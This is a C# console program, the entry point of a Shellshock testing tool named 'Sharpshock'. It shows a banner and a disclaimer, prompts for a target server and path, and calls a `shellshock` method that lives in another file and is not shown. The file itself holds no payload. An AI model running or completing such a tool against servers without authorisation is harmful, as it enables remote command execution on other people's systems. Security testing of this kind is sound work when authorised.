using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Http;
using System.IO.Compression;
using System.IO;
using Sharpshock;

namespace Sharpshock
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Clear();
            Console.WriteLine(@"
   ▄▄▄▄▄    ▄  █ ██   █▄▄▄▄ █ ▄▄         ▄▄▄▄▄    ▄  █ ████▄ ▄█▄    █  █▀ 
  █     ▀▄ █   █ █ █  █  ▄▀ █   █       █     ▀▄ █   █ █   █ █▀ ▀▄  █▄█   
▄  ▀▀▀▀▄   ██▀▀█ █▄▄█ █▀▀▌  █▀▀▀      ▄  ▀▀▀▀▄   ██▀▀█ █   █ █   ▀  █▀▄   
 ▀▄▄▄▄▀    █   █ █  █ █  █  █          ▀▄▄▄▄▀    █   █ ▀████ █▄  ▄▀ █  █  
              █     █   █    █                      █        ▀███▀    █   
             ▀     █   ▀      ▀                    ▀                 ▀    
                  ▀                                                       ");
            Console.WriteLine("Author: Pr0ton.{0}{1}This tool whether a server is vulnerable to a shellshock attack by changing the user-agent to a malicious command.{2}{3}By using this tool you agree to take fully responsibility on your own actions.", Environment.NewLine, Environment.NewLine, Environment.NewLine, Environment.NewLine);
            Console.WriteLine("------------------------------------------------------------------------------");

            // Begin program
            var evil = new sendCommand();
            var server = "";
            var filePath = "";

            Console.WriteLine("[+] Vulnerable server:");
            server = Console.ReadLine();

            Console.WriteLine("{0}[+] Vulnerable path:",Environment.NewLine);
            filePath = Console.ReadLine();

            evil.shellshock(server,filePath);

            Console.ReadKey();
        }
    }
}
